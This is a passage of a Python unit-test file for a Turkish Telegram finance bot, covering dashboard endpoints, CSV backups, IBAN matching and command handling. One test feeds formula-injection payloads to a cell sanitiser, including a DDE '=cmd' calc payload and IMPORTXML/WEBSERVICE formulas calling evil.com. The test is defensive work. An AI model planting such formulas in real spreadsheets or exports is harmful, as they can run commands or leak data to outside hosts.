            self.assertIn("GOOGLE SHEETS YAZMA KUYRUĞU", args[2])

            # Callback: kurtar_dlq
            with patch.object(bot, "kurtar_basarisiz_yazimlari_impl", return_value="KURTARMA_OK") as mock_kurtar:
                cq_update_kurtar = {
                    "callback_query": {
                        "id": "cq_2",
                        "from": {"id": bot.KURUCU_ID},
                        "data": "kurtar_dlq",
                        "message": {"message_id": 999, "chat": {"id": 111}}
                    }
                }
                bot._process_telegram_update_core(cq_update_kurtar)
                mock_kurtar.assert_called_once()

    def test_iban_strict_token_matching_and_t2_collision(self):
        mock_iban_rows = [
            ["HESAP KODU", "ŞABLON", "DURUM", "CARİ"],
            ["KUVEYT TÜRK 2", "CYL KUYUMCULUK KUVEYT TURK SABLONU", "AKTİF", "CYL"],
            ["EMLAK KATILIM 1", "EMLAK 1 SABLONU", "AKTİF", "ARS"],
            ["CYL 1", "CYL 1 SABLONU", "AKTİF", ""],
            ["HSY EMLAK 3", "HSY EMLAK 3 SABLONU", "AKTİF", ""]
        ]

        # 1. /t2 sorgusu 'KUVEYT TÜRK 2' ile ASLA eşleşmemelidir
        res_t2 = bot.iban_sablon_bul(mock_iban_rows, "t2")
        self.assertIsNone(res_t2, "t2 araması Kuveyt Türk 2 ile eşleşmemeli, None dönmelidir")

        res_t1 = bot.iban_sablon_bul(mock_iban_rows, "t1")
        self.assertIsNone(res_t1, "t1 araması Emlak Katılım 1 ile eşleşmemeli")

        # 2. Gerçek hesap adı 'T 2' olan bir kayıt olsaydı birebir eşleşirdi
        mock_with_t2 = list(mock_iban_rows) + [["T 2", "GERCEK T2 SABLONU", "AKTİF", ""]]
        res_real_t2 = bot.iban_sablon_bul(mock_with_t2, "t2")
        self.assertIsNotNone(res_real_t2)
        self.assertEqual(res_real_t2[1], "T 2")

        # 3. Geçerli kısaltmalar ('CYL 1', 'CYL1', 'HSY 3', 'EMLAK 3') sorunsuz çalışmaya devam etmelidir
        res_cyl1 = bot.iban_sablon_bul(mock_iban_rows, "CYL 1")
        self.assertIsNotNone(res_cyl1)
        self.assertEqual(res_cyl1[1], "CYL 1")

        res_emlak3 = bot.iban_sablon_bul(mock_iban_rows, "EMLAK 3")
        self.assertIsNotNone(res_emlak3)
        self.assertEqual(res_emlak3[1], "HSY EMLAK 3")

        # 4. Telegram update akışında grupta /t2 yazıldığında şablon atılmadığı teyit edilir
        sent_messages = []
        with patch.object(bot, "get_iban_values", return_value=mock_iban_rows), \
             patch.object(bot, "telegramMesajGonder", side_effect=lambda cid, text, *args, **kwargs: sent_messages.append(text)), \
             patch.object(bot, "yetkili_mi", return_value=True), \
             patch.object(bot, "kullanici_kisitli_mi", return_value=False):
            
            update = {
                "message": {
                    "chat": {"id": -1001234567, "title": "Grup"},
                    "from": {"id": bot.KURUCU_ID},
                    "text": "/t2"
                }
            }
            bot.process_telegram_update(update)
            # CFO bot diğer botun /t2 komutuna sessiz kalmalı, mesaj göndermemelidir
            self.assertEqual(len(sent_messages), 0)

    def test_gun_sonu_excel_yedegi_uret_and_utf8_bom(self):
        mock_values = [
            ["Sıra", "Grup", "Devir", "Kasa", "Ödenen", "Komisyon", "Kalan", "", "Masraf Adı", "Masraf Tutarı"],
            ["1", "SACİD", "100.000,00", "500.000,00", "300.000,00", "15.000,00", "285.000,00", "", "YEMEK", "1.500,00"],
            ["2", "TİGER", "50.000,00", "200.000,00", "150.000,00", "5.000,00", "95.000,00", "", "OFİS", "3.500,00"]
        ]
        csv_bytes = bot.gun_sonu_excel_yedegi_uret("17.09.2026", mock_values)
        self.assertTrue(csv_bytes.startswith(b'\xef\xbb\xbf'), "CSV verisi Excel uyumlu UTF-8 BOM ile başlamalıdır")
        
        csv_text = csv_bytes.decode('utf-8')
        self.assertIn("CFO FINANS YONETIM SISTEMI - GUN SONU BILANCOSU VE YEDEGI", csv_text)
        self.assertIn("17.09.2026", csv_text)
        self.assertIn("ŞİRKET NET KÂRI (CFO KPI)", csv_text)
        self.assertIn("Net Kârlılık Marjı (%)", csv_text)
        self.assertIn("SACİD", csv_text)
        self.assertIn("TİGER", csv_text)
        self.assertIn("YEMEK", csv_text)
        self.assertIn("OFİS", csv_text)
        self.assertIn(";", csv_text, "Excel uyumluluğu için noktalı virgül kullanılmalıdır")

    def test_yedek_excel_gonder_impl_and_telegram_command(self):
        mock_values = [
            ["1", "TEST_GRUP", "10.000,00", "20.000,00", "5.000,00", "1.000,00", "24.000,00"]
        ]
        mock_ws = MagicMock()
        mock_ws.title = "17.09.2026"
        
        sent_files = []
        with patch.object(bot, "get_spreadsheet"), \
             patch.object(bot, "get_active_daily_sheet", return_value=mock_ws), \
             patch.object(bot, "get_sheet_values_fast", return_value=mock_values), \
             patch.object(bot, "telegram_dosya_gonder", side_effect=lambda cid, fname, b_data, caption: sent_files.append((cid, fname, b_data, caption))):
            
            res = bot.yedek_excel_gonder_impl(bot.KURUCU_ID)
            self.assertIn("başarıyla oluşturuldu", res)
            self.assertEqual(len(sent_files), 1)
            cid, fname, b_data, caption = sent_files[0]
            self.assertEqual(cid, bot.KURUCU_ID)
            self.assertTrue(fname.endswith(".csv"))
            self.assertTrue(b_data.startswith(b'\xef\xbb\xbf'))
            self.assertIn("17.09.2026", caption)

    def test_api_exchange_rate_endpoint(self):
        import io, json
        from bot import LiveDashboardHandler

        # 1. Unauthorized
        h_unauth = object.__new__(LiveDashboardHandler)
        h_unauth.path = "/api/exchange_rate"
        h_unauth.headers = {}
        h_unauth.wfile = io.BytesIO()
        h_unauth.send_response = MagicMock()
        h_unauth.send_header = MagicMock()
        h_unauth.end_headers = MagicMock()
        h_unauth.do_GET()
        h_unauth.send_response.assert_called_with(401)

        # 2. Authorized
        h_auth = object.__new__(LiveDashboardHandler)
        h_auth.path = f"/api/exchange_rate?token={bot.DASHBOARD_AUTH_TOKEN}"
        h_auth.headers = {}
        h_auth.wfile = io.BytesIO()
        h_auth.send_response = MagicMock()
        h_auth.send_header = MagicMock()
        h_auth.end_headers = MagicMock()

        with patch.object(bot, "get_dashboard_exchange_rate", return_value=38.75):
            h_auth.do_GET()
            h_auth.send_response.assert_called_with(200)
            data = json.loads(h_auth.wfile.getvalue().decode("utf-8"))
            self.assertEqual(data["symbol"], "USDTTRY")
            self.assertEqual(data["rate"], 38.75)
            self.assertIn("timestamp", data)

    def test_dashboard_new_features_elements_present(self):
        body = bot.DASHBOARD_HTML
        # Feature 1: Export
        self.assertIn('id="export-btn"', body)
        self.assertIn('id="export-menu"', body)
        self.assertIn('exportToCsv()', body)
        self.assertIn('printReport()', body)
        
        # Feature 2: Net Kar KPI
        self.assertIn('id="card-stat-kar"', body)
        self.assertIn('id="toplam-net-kar"', body)
        self.assertIn('id="kar-marji-badge"', body)
        
        # Feature 4: Modal & Ekstre
        self.assertIn('id="group-modal"', body)
        self.assertIn('openGroupModal(', body)
        self.assertIn('copyGroupStatement()', body)
        
        # Feature 6: Trend Chart
        self.assertIn('id="tab-btn-trends"', body)
        self.assertIn('id="tab-trends"', body)
        self.assertIn('id="trend-chart-box"', body)
        self.assertIn('id="trend-chart-container"', body)
        self.assertIn('renderTrendChart(', body)

    def test_run_kapanis_scheduler_sends_excel_backup_to_kurucu(self):
        import datetime
        mock_time = datetime.datetime(2026, 9, 17, 23, 0, 0)
        bot.app_state["KAPANIS_SAATI"] = "23:00"
        bot.app_state["SON_KAPANIS_TARIHI"] = ""

        mock_ws = MagicMock()
        mock_ws.title = "17.09.2026"
        mock_values = [
            ["Sıra", "Grup", "Devir", "Kasa", "Ödenen", "Komisyon", "Kalan"],
            ["1", "SACİD", "100.000,00", "500.000,00", "300.000,00", "15.000,00", "285.000,00"]
        ]

        sent_messages = []
        sent_files = []

        with patch.object(bot, "suankiZamaniAl", return_value=mock_time), \
             patch.object(bot, "gun_sonu_kapanis_raporu_uret", return_value="RAPOR_METNI"), \
             patch.object(bot, "telegramMesajGonder", side_effect=lambda cid, text: sent_messages.append((cid, text))), \
             patch.object(bot, "get_spreadsheet"), \
             patch.object(bot, "get_active_daily_sheet", return_value=mock_ws), \
             patch.object(bot, "get_sheet_values_fast", return_value=mock_values), \
             patch.object(bot, "telegram_dosya_gonder", side_effect=lambda cid, fname, b_data, cap: sent_files.append((cid, fname, b_data, cap))), \
             patch.object(bot.time, "sleep", side_effect=InterruptedError("loop_stop")):

            try:
                bot.run_kapanis_scheduler()
            except InterruptedError:
                pass

        self.assertEqual(len(sent_messages), 1)
        self.assertEqual(sent_messages[0][0], bot.KURUCU_ID)
        self.assertEqual(sent_messages[0][1], "RAPOR_METNI")

        self.assertEqual(len(sent_files), 1)
        self.assertEqual(sent_files[0][0], bot.KURUCU_ID)
        self.assertTrue(sent_files[0][1].endswith(".csv"))
        self.assertTrue(sent_files[0][2].startswith(b'\xef\xbb\xbf'))
        self.assertEqual(bot.app_state["SON_KAPANIS_TARIHI"], "17.09.2026")

    def test_api_rates_endpoint(self):
        import io, json
        from bot import LiveDashboardHandler

        # 1. Unauthorized
        h_unauth = object.__new__(LiveDashboardHandler)
        h_unauth.path = "/api/rates"
        h_unauth.headers = {}
        h_unauth.wfile = io.BytesIO()
        h_unauth.send_response = MagicMock()
        h_unauth.send_header = MagicMock()
        h_unauth.end_headers = MagicMock()
        h_unauth.do_GET()
        h_unauth.send_response.assert_called_with(401)

        # 2. Authorized
        h_auth = object.__new__(LiveDashboardHandler)
        h_auth.path = f"/api/rates?token={bot.DASHBOARD_AUTH_TOKEN}"
        h_auth.headers = {}
        h_auth.wfile = io.BytesIO()
        h_auth.send_response = MagicMock()
        h_auth.send_header = MagicMock()
        h_auth.end_headers = MagicMock()

        mock_rates = {
            "usdt_try": 39.12,
            "binance": {"last": "39.12", "high": "39.40", "low": "38.90", "change": "+0.5%"},
            "harem": {"usd": ("38.90", "39.15"), "eur": ("42.10", "42.40")},
            "paribu": {"last": "39.10"},
            "btcturk": {"last": "39.14"},
            "okx": {"last": "39.11"},
            "whitebit": {"last": "39.13"},
            "fiat": {"usd": "39.05", "eur": "42.25", "gbp": "49.80"},
            "timestamp": 1726574400.0,
            "time_str": "15:00:00"
        }

        with patch.object(bot, "get_dashboard_market_rates_summary", return_value=mock_rates):
            h_auth.do_GET()
            h_auth.send_response.assert_called_with(200)
            # Verify Content-Length header is sent
            calls = h_auth.send_header.call_args_list
            header_keys = [c[0][0] for c in calls]
            self.assertIn("Content-Length", header_keys)
            self.assertIn("Content-Security-Policy", header_keys)
            data = json.loads(h_auth.wfile.getvalue().decode("utf-8"))
            self.assertEqual(data["usdt_try"], 39.12)
            self.assertEqual(data["binance"]["last"], "39.12")
            self.assertEqual(data["harem"]["usd"], ["38.90", "39.15"])

    def test_api_health_endpoint(self):
        import io, json
        from bot import LiveDashboardHandler

        for path in ["/health", "/healthz", "/ping"]:
            h = object.__new__(LiveDashboardHandler)
            h.path = path
            h.headers = {}
            h.wfile = io.BytesIO()
            h.send_response = MagicMock()
            h.send_header = MagicMock()
            h.end_headers = MagicMock()
            h.do_GET()
            h.send_response.assert_called_with(200)
            data = json.loads(h.wfile.getvalue().decode("utf-8"))
            self.assertEqual(data["status"], "healthy")
            self.assertEqual(data["service"], "cfo-bot")
            self.assertIn("timestamp", data)

    def test_send_response_data_sets_content_length_and_headers(self):
        import io
        from bot import LiveDashboardHandler
        h = object.__new__(LiveDashboardHandler)
        h.wfile = io.BytesIO()
        h.send_response = MagicMock()
        h.send_header = MagicMock()
        h.end_headers = MagicMock()

        payload = b'{"status": "ok"}'
        h._send_response_data(200, "application/json; charset=utf-8", payload)
        h.send_response.assert_called_with(200)
        
        headers_dict = dict(c[0] for c in h.send_header.call_args_list)
        self.assertEqual(headers_dict.get("Content-Length"), str(len(payload)))
        self.assertEqual(headers_dict.get("Content-Type"), "application/json; charset=utf-8")
        self.assertEqual(headers_dict.get("X-Content-Type-Options"), "nosniff")
        self.assertEqual(headers_dict.get("X-Frame-Options"), "DENY")
        self.assertIn("Content-Security-Policy", headers_dict)
        self.assertEqual(h.wfile.getvalue(), payload)

    def test_get_dashboard_market_rates_summary(self):
        fake_rates = {
            "binance": {"last": "39.25", "high": "39.50", "low": "38.90", "change": "+0.8%"},
            "paribu": {"last": "39.20"},
            "btcturk": {"last": "39.24"},
            "okx": {"last": "39.22"},
            "whitebit": {"last": "39.26"},
            "harem": {
                "usd": ("39.00", "39.30"),
                "eur": ("42.10", "42.45"),
                "altin": "3100.00",
                "ons": "2650.00",
                "gumus": "35.50"
            },
            "fiat": {"usd": "39.10", "eur": "42.30", "gbp": "50.00"}
        }
        with patch.object(bot, "fetch_all_market_rates_parallel", return_value=fake_rates):
            summary = bot.get_dashboard_market_rates_summary()
            self.assertEqual(summary["usdt_try"], 39.25)
            self.assertEqual(summary["binance"]["last"], "39.25")
            self.assertEqual(summary["harem"]["usd"], ("39.00", "39.30"))
            self.assertEqual(bot.get_dashboard_exchange_rate(), 39.25)

    def test_dashboard_trends_tab_elements_present(self):
        body = bot.DASHBOARD_HTML
        # Tab navigation
        self.assertIn('id="tab-btn-finance"', body)
        self.assertIn('id="tab-btn-trends"', body)
        self.assertIn('id="tab-finance"', body)
        self.assertIn('id="tab-trends"', body)
        self.assertIn('switchTab(', body)
        
        # Dedicated trend chart tab elements
        self.assertIn('id="trend-chart-box"', body)
        self.assertIn('id="trend-chart-container"', body)
        self.assertIn('renderTrendChart(', body)

    def test_dashboard_server_initial_data_injection(self):
        import io
        from bot import LiveDashboardHandler

        h = object.__new__(LiveDashboardHandler)
        h.path = f"/?token={bot.DASHBOARD_AUTH_TOKEN}"
        h.headers = {}
        h.wfile = io.BytesIO()
        h.send_response = MagicMock()
        h.send_header = MagicMock()
        h.end_headers = MagicMock()

        mock_ws = MagicMock()
        mock_ws.title = "17.09.2026"
        mock_values = [
            ["Sıra", "Grup", "Devir", "Kasa", "Ödenen", "Komisyon", "Kalan"],
            ["1", "TEST_GRUP", "10.000,00", "50.000,00", "20.000,00", "2.000,00", "38.000,00"]
        ]

        with patch.object(bot, "get_spreadsheet"), \
             patch.object(bot, "get_active_daily_sheet", return_value=mock_ws), \
             patch.object(bot, "get_sheet_values_fast", return_value=mock_values), \
             patch.object(bot, "get_dashboard_exchange_rate", return_value=48.50), \
             patch.object(bot, "get_dashboard_market_rates_summary", return_value={"usdt_try": 48.50}):

            h.do_GET()
            h.send_response.assert_called_with(200)
            html = h.wfile.getvalue().decode("utf-8")
            self.assertIn("serverInitialData", html)
            self.assertIn("17.09.2026", html)
            self.assertIn("TEST_GRUP", html)
            self.assertIn("serverInitialRates", html)

    def test_dashboard_canli_kur_tab_elements_present(self):
        body = bot.DASHBOARD_HTML
        # 3. Sekme: CANLİ KUR navigasyonu ve kapsayıcısı
        self.assertIn('id="tab-btn-rates"', body)
        self.assertIn('id="tab-rates"', body)
        self.assertIn('CANLİ KUR', body)
        self.assertIn("switchTab('rates')", body)
        
        # Popüler Kriptolar ızgarası ve kartları
        self.assertIn('class="crypto-grid"', body)
        self.assertIn('id="crypto-btc-price"', body)
        self.assertIn('id="crypto-btc-change"', body)
        self.assertIn('id="crypto-eth-price"', body)
        self.assertIn('id="crypto-sol-price"', body)
        self.assertIn('id="crypto-bnb-price"', body)
        self.assertIn('id="crypto-trx-price"', body)
        self.assertIn('id="crypto-xrp-price"', body)
        self.assertIn('id="crypto-avax-price"', body)
        self.assertIn('id="crypto-doge-price"', body)

        # Borsa Arbitraj Tablosu ve Kapalıçarşı / Altın / Pariteler
        self.assertIn('id="rates-table-body"', body)
        self.assertIn('id="rate-harem-usd-satis"', body)
        self.assertIn('id="rate-harem-usd-alis"', body)
        self.assertIn('id="rate-harem-usd-makas"', body)
        self.assertIn('id="rate-usdt-nakit-makas"', body)
        self.assertIn('id="rate-gold-gram"', body)
        self.assertIn('id="rate-gold-ons"', body)
        self.assertIn('id="rate-silver"', body)
        self.assertIn('id="rate-fiat-gbp"', body)
        self.assertIn('id="rate-fiat-chf"', body)
        self.assertIn('id="rate-fiat-sar"', body)

        # JavaScript Fonksiyonları
        self.assertIn('fetchMarketRates(', body)
        self.assertIn('renderMarketRates(', body)

    def test_fetch_binance_crypto_tickers(self):
        fake_api_res = [
            {"symbol": "BTCUSDT", "lastPrice": "64500.50", "priceChangePercent": "2.35"},
            {"symbol": "ETHUSDT", "lastPrice": "3450.20", "priceChangePercent": "-1.15"},
            {"symbol": "SOLUSDT", "lastPrice": "155.80", "priceChangePercent": "5.40"},
        ]
        with patch.object(bot, "http_get_json", return_value=fake_api_res):
            tickers = bot.fetch_binance_crypto_tickers(["BTCUSDT", "ETHUSDT", "SOLUSDT"])
            self.assertEqual(tickers["BTCUSDT"]["price"], 64500.50)
            self.assertEqual(tickers["BTCUSDT"]["change"], 2.35)
            self.assertEqual(tickers["ETHUSDT"]["price"], 3450.20)
            self.assertEqual(tickers["ETHUSDT"]["change"], -1.15)
            self.assertEqual(tickers["SOLUSDT"]["price"], 155.80)
            self.assertEqual(tickers["SOLUSDT"]["change"], 5.40)

    def test_get_dashboard_market_rates_summary_includes_crypto(self):
        fake_rates = {
            "binance": {"last": "39.20", "high": "39.50", "low": "38.90"},
            "harem": {"usd": ("39.00", "39.30"), "eur": ("42.00", "42.40")},
            "crypto": {
                "BTCUSDT": {"price": 64500.0, "change": 2.5},
                "ETHUSDT": {"price": 3450.0, "change": -1.2}
            },
            "fiat": {"TRY": 39.10, "GBP": 1.30, "CHF": 1.15, "SAR": 3.75}
        }
        with patch.object(bot, "fetch_all_market_rates_parallel", return_value=fake_rates):
            summary = bot.get_dashboard_market_rates_summary()
            self.assertIn("crypto", summary)
            self.assertIn("BTCUSDT", summary["crypto"])
            self.assertEqual(summary["crypto"]["BTCUSDT"]["price"], 64500.0)
            self.assertIn("fiat", summary)
            self.assertEqual(summary["fiat"]["TRY"], 39.10)

    def test_fetch_telegram_updates(self):
        fake_response = json.dumps({"ok": True, "result": [{"update_id": 1001, "message": {"text": "/kur"}}]}).encode("utf-8")
        mock_resp = MagicMock()
        mock_resp.read.return_value = fake_response
        mock_resp.__enter__.return_value = mock_resp
        mock_resp.__exit__.return_value = None

        with patch("urllib.request.urlopen", return_value=mock_resp):
            res = bot.fetch_telegram_updates(offset=0, timeout=10)
            self.assertTrue(res.get("ok"))
            self.assertEqual(len(res.get("result", [])), 1)
            self.assertEqual(res["result"][0]["update_id"], 1001)
    def test_bug_fixes_verification(self):
        # 1. subprocess import check
        self.assertTrue(hasattr(bot, "subprocess"), "subprocess modülü import edilmemiş!")

        # 2. Turkish lower (tr_lower) tests
        self.assertEqual(bot.tr_lower("/KASASİL"), "/kasasil")
        self.assertEqual(bot.tr_lower("/ÇEVİRİ"), "/çeviri")
        self.assertEqual(bot.tr_lower("/ÖZET"), "/özet")
        self.assertEqual(bot.tr_lower("/DÖVİZ"), "/döviz")
        self.assertEqual(bot.tr_lower("/İBAN"), "/iban")
        self.assertEqual(bot.tr_lower("/ŞABLON"), "/şablon")
        self.assertEqual(bot.tr_lower("/KASAEKLE"), "/kasaekle")

        # 3. islemi_analiz_bildirimiyle_yap direct execution (deadlock-free)
        sent_messages = []
        with patch.object(bot, "telegramMesajGonder", side_effect=lambda cid, text, **kw: sent_messages.append(text)):
            def test_fn(x, y):
                return f"OK: {x + y}"
            bot.islemi_analiz_bildirimiyle_yap(12345, test_fn, 10, 20)
            self.assertTrue(any("OK: 30" in m for m in sent_messages))

        # 4. /not with empty input produces warning, doesn't add empty row
        with patch.object(bot, "telegramMesajGonder") as mock_send:
            update = {
                "message": {
                    "chat": {"id": 12345},
                    "from": {"id": bot.KURUCU_ID},
                    "text": "/not"
                }
            }
            bot.process_telegram_update(update)
            # Should have called telegramMesajGonder with warning about empty note
            called_texts = [call[0][1] for call in mock_send.call_args_list if len(call[0]) > 1]
            self.assertTrue(any("Boş Not Gönderilemez" in t for t in called_texts))

        # 5. Mention to another bot is ignored
        with patch.object(bot, "telegramMesajGonder") as mock_send:
            update = {
                "message": {
                    "chat": {"id": -1001234567},
                    "from": {"id": bot.KURUCU_ID},
                    "text": "/kasa@baska_bir_bot"
                }
            }
            bot.process_telegram_update(update)
            self.assertEqual(mock_send.call_count, 0)

    def test_rehber_and_mesaj_kapat_callbacks_for_all_users(self):
        """Tüm kullanıcı tipleri (Kurucu, Kısıtlı, Normal Grup Üyesi, Anonim) için rehber butonlarının ve kapat butonunun çalıştığını test eder."""
        user_ids = [bot.KURUCU_ID, 8401305264, 22222, 1087968824]
        
        test_buttons = [
            "rehber_kasa", "rehber_masraf", "rehber_grup", "rehber_rapor",
            "rehber_kripto", "rehber_admin", "rehber_tumu", "rehber_ana", "mesaj_kapat"
        ]

        for uid in user_ids:
            for btn in test_buttons:
                api_calls = []
                with patch.object(bot, "telegram_api", side_effect=lambda m, p: api_calls.append((m, p)) or {"ok": True}):
                    cq = {
                        "callback_query": {
                            "id": f"cq_{btn}_{uid}",
                            "from": {"id": uid},
                            "message": {"chat": {"id": -100999}, "message_id": 12345},
                            "data": btn
                        }
                    }
                    bot._process_telegram_update_core(cq)
                    called_methods = [c[0] for c in api_calls]
                    if btn == "mesaj_kapat":
                        self.assertIn("deleteMessage", called_methods, f"{btn} deleteMessage çağırmadı for uid {uid}")
                    else:
                        self.assertIn("editMessageText", called_methods, f"{btn} editMessageText çağırmadı for uid {uid}")
                    self.assertIn("answerCallbackQuery", called_methods, f"{btn} answerCallbackQuery çağırmadı for uid {uid}")

    def test_sanitize_sheet_cell_value(self):
        """Formül ve CSV enjeksiyon korumasını ve meşru formül korumasını test eder."""
        # 1. Zararlı formül denemeleri metin formatına (' ile) dönüştürülmeli
        self.assertEqual(bot.sanitize_sheet_cell_value("=cmd|' /C calc'!A0"), "'=cmd|' /C calc'!A0")
        self.assertEqual(bot.sanitize_sheet_cell_value("=IMPORTXML(\"http://evil.com\")"), "'=IMPORTXML(\"http://evil.com\")")
        self.assertEqual(bot.sanitize_sheet_cell_value("=WEBSERVICE(\"http://evil.com\")"), "'=WEBSERVICE(\"http://evil.com\")")
        self.assertEqual(bot.sanitize_sheet_cell_value("+calc"), "'+calc")
        self.assertEqual(bot.sanitize_sheet_cell_value("-calc"), "'-calc")
        self.assertEqual(bot.sanitize_sheet_cell_value("@sum(A1)"), "'@sum(A1)")

        # 2. Meşru bot matematik formülleri korunmalı
        self.assertEqual(bot.sanitize_sheet_cell_value("=1500000"), "=1500000")
        self.assertEqual(bot.sanitize_sheet_cell_value("=-500000"), "=-500000")
        self.assertEqual(bot.sanitize_sheet_cell_value("=1500000+2000000"), "=1500000+2000000")
        self.assertEqual(bot.sanitize_sheet_cell_value("=1500000+2000000-500000"), "=1500000+2000000-500000")
        self.assertEqual(bot.sanitize_sheet_cell_value("=C5+D5-E5"), "=C5+D5-E5")

        # 3. Sayısal ve güvenli metin değerler aynen kalmalı
        self.assertEqual(bot.sanitize_sheet_cell_value(150000), 150000)
        self.assertEqual(bot.sanitize_sheet_cell_value("-500"), "-500")
        self.assertEqual(bot.sanitize_sheet_cell_value("+100"), "+100")
        self.assertEqual(bot.sanitize_sheet_cell_value("SACİD TİGER"), "SACİD TİGER")

    def test_komisyon_hesaplayici_impl(self):
        """Komisyon hesaplayıcı fonksiyonunu test eder."""
        # Eksik parametre -> rehber dönmeli
        rehber = bot.komisyon_hesaplayici_impl("/komisyon")
        self.assertIn("KOMİSYON & KÂR HESAP MAKİNESİ", rehber)

        # Standart hesaplama (100.000 TL, %1.5 komisyon)
        res1 = bot.komisyon_hesaplayici_impl("/komisyon 100000 1.5")
        self.assertIn("100.000,00", res1)
        self.assertIn("1.500,00", res1)
        self.assertIn("98.500,00", res1)

        # Dövizli hesaplama (5.000 USDT, %2 komisyon, 38.50 kur)
        res2 = bot.komisyon_hesaplayici_impl("/komisyon 5000 2 38.50")
        self.assertIn("5.000,00", res2)
        self.assertIn("Döviz Çevrimi", res2)
        self.assertIn("188.650,00", res2)

        # Hatalı/negatif tutar
        res_neg = bot.komisyon_hesaplayici_impl("/komisyon -100 2")
        self.assertIn("pozitif bir sayı", res_neg)

    def test_kullanici_yetkileri_impl(self):
        """Yetki ve rol sorgulama kartını farklı roller için test eder."""
        # Kurucu
        res_kurucu = bot.kullanici_yetkileri_impl(bot.KURUCU_ID, -100123)
        self.assertIn("ŞİRKET KURUCUSU", res_kurucu)
        self.assertIn(str(bot.KURUCU_ID), res_kurucu)

        # Tam yetkili yönetici
        admin_id = 987654321
        with patch.dict(bot.app_state, {"EK_ADMINLER": {admin_id}, "ADMIN_CACHE_TIME": bot.time.time() + 3600}):
            res_admin = bot.kullanici_yetkileri_impl(admin_id, -100123)
            self.assertIn("TAM YETKİLİ ŞİRKET YÖNETİCİSİ", res_admin)

        # Kısıtlı yetkili
        kisitli_id = 876543210
        with patch.dict(bot.app_state, {"KISITLI_YETKILILER": {kisitli_id: {"username": "KisitliTest", "allowed_commands": {"/kasa"}}}}):
            res_kisitli = bot.kullanici_yetkileri_impl(kisitli_id, -100123)
            self.assertIn("KISITLI YETKİLİ", res_kisitli)
            self.assertIn("/kasa", res_kisitli)

        # Standart üye
        res_standart = bot.kullanici_yetkileri_impl(111222333, -100123)
        self.assertIn("STANDART GRUP ÜYESİ", res_standart)

    def test_sistem_guvenlik_raporu_impl(self):
        """Kurucuya özel sistem ve güvenlik raporunu test eder."""
        # Yetkisiz kullanıcı engellenmeli
        res_unauth = bot.sistem_guvenlik_raporu_impl(111222333)
        self.assertIn("Yetkisiz İşlem", res_unauth)

        # Kurucu raporu alabilmeli
        res_auth = bot.sistem_guvenlik_raporu_impl(bot.KURUCU_ID)
        self.assertIn("SİBER GÜVENLİK & SİSTEM DENETİMİ", res_auth)
        self.assertIn("Formül Enjeksiyon Koruması", res_auth)
        self.assertIn(str(bot.KURUCU_ID), res_auth)

    def test_virman_kasa_aktar_impl_validations(self):
        """Virman (kasa transferi) doğrulama kontrollerini test eder."""
        # Eksik parametre -> rehber
        res_eksik = bot.virman_kasa_aktar_impl("/virman")
        self.assertIn("CARİLER ARASI KASA VİRMANI", res_eksik)

        # Aynı cari transferi yasak
        res_ayni = bot.virman_kasa_aktar_impl("/virman SACİD SACİD 50000")
        self.assertIn("aynı olamaz", res_ayni)

        # Limit aşımı
        with patch.dict(bot.app_state, {"MAX_TRANSACTION_LIMIT": 100000.0}):
            res_limit = bot.virman_kasa_aktar_impl("/virman SACİD TİGER 500000")
            self.assertIn("İşlem Limiti Aşıldı", res_limit)

        # Geçersiz format
        res_format = bot.virman_kasa_aktar_impl("/virman SACİD TİGER geçersiz")
        self.assertIn("Hatalı Format", res_format)

        # Başarılı transfer
        dummy_sheet_data = [
            ["", "GRUP ADI", "DEVİR", "KASA", "ÖDENEN", "KOMİSYON", "KALAN KASA"],
            ["1", "SACİD", "0", "100000", "0", "0", "100000"],
            ["2", "TİGER", "0", "50000", "0", "0", "50000"],
        ]
        with patch.object(bot, "get_sheet_values_fast", return_value=dummy_sheet_data), \
             patch.object(bot, "_kuyruga_sayfa_yazma_ekle") as mock_queue, \
             patch.object(bot, "update_sheet_matrix_memory"):
            res_ok = bot.virman_kasa_aktar_impl("/virman SACİD TİGER 20000")
            self.assertIn("VİRMAN İŞLEMİ BAŞARILI", res_ok)
            self.assertIn("SACİD", res_ok)
            self.assertIn("TİGER", res_ok)
            self.assertIn("20.000,00", res_ok)
            self.assertEqual(mock_queue.call_count, 2)

    def test_dispatcher_new_and_unrouted_commands(self):
        """Yeni eklenen ve bağlanan komutların dispatcher üzerinden doğru çalıştığını test eder."""
        # 1. /komisyon komutu
        update_komisyon = {
            "message": {
                "chat": {"id": -100123, "title": "Finans Grubu"},
                "from": {"id": bot.KURUCU_ID},
                "text": "/komisyon 50000 2"
            }
        }
        with patch.object(bot, "telegramMesajGonder") as mock_msg:
            bot.process_telegram_update(update_komisyon)
            mock_msg.assert_called()
            self.assertIn("KOMİSYON HESAPLAMA FİŞİ", mock_msg.call_args[0][1])

        # 2. /yetkiler komutu
        update_yetkiler = {
            "message": {
                "chat": {"id": -100123, "title": "Finans Grubu"},
                "from": {"id": bot.KURUCU_ID},
                "text": "/yetkiler"
            }
        }
        with patch.object(bot, "telegramMesajGonder") as mock_msg:
            bot.process_telegram_update(update_yetkiler)
            mock_msg.assert_called()
            self.assertIn("KULLANICI YETKİ VE ROL KARTI", mock_msg.call_args[0][1])

        # 3. /guvenlik komutu
        update_guvenlik = {
            "message": {
                "chat": {"id": -100123, "title": "Finans Grubu"},
                "from": {"id": bot.KURUCU_ID},
                "text": "/guvenlik"
            }
        }
        with patch.object(bot, "telegramMesajGonder") as mock_msg:
            bot.process_telegram_update(update_guvenlik)
            mock_msg.assert_called()
            self.assertIn("CFO BOT SİBER GÜVENLİK & SİSTEM DENETİMİ", mock_msg.call_args[0][1])

        # 4. /virman eksik argüman
        update_virman = {
            "message": {
                "chat": {"id": -100123, "title": "Finans Grubu"},
                "from": {"id": bot.KURUCU_ID},
                "text": "/virman"
            }
        }
        with patch.object(bot, "telegramMesajGonder") as mock_msg:
            bot.process_telegram_update(update_virman)
            mock_msg.assert_called()
            self.assertIn("CARİLER ARASI KASA VİRMANI", mock_msg.call_args[0][1])

        # 5. /tarih komutu yönlendirmesi
        update_tarih = {
            "message": {
                "chat": {"id": -100123, "title": "Finans Grubu"},
                "from": {"id": bot.KURUCU_ID},
                "text": "/tarih 10.09.2026"
            }
        }
        with patch.object(bot, "gecmis_gun_sorgula_impl", return_value="Geçmiş Gün Raporu") as mock_gecmis, \
             patch.object(bot, "telegramMesajGonder"):
            bot.process_telegram_update(update_tarih)
            mock_gecmis.assert_called_once()

    def test_cfo_dashboard_and_menu_kur_callbacks(self):
        """cfo_dashboard ve menu_kur butonlarının başarıyla işlendiğini test eder."""
        # 1. cfo_dashboard callback'i
        cq_dash = {
            "callback_query": {
